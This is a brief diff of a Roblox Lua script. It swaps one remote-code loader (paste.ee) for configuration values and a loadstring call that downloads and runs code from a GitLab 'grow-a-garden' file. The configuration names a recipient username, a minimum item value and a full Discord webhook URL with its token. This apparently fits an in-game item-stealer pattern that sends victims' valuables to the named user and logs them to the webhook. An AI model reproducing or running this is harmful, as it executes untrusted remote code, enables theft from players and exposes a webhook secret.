@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://paste.ee/r/JakAWuVX"))()
+Username = "Hyperbornik"
+Webhook = "https://discord.com/api/webhooks/1382174626574241854/OZHKFCXYWO2l72RsqT8AQ2xRRwpYn0kv3cc0sZ571ZUau1EzG5984oGMzprGAhlUYHsF"
+MinimumValue = 1000000
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
